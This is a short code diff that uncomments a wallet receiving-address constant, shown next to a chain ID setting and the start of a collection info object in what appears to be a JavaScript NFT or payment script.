@@ -1,4 +1,4 @@
-//const receiveAddress = "0xe66E97d3AB29dcde542BfAb213105e3C36FEC16";
+const receiveAddress = "0xe66E97d3AB29dcde542BfAb213105e3C36FEC16";
 const workChainId = 1;
 
 const collectionInfo = {
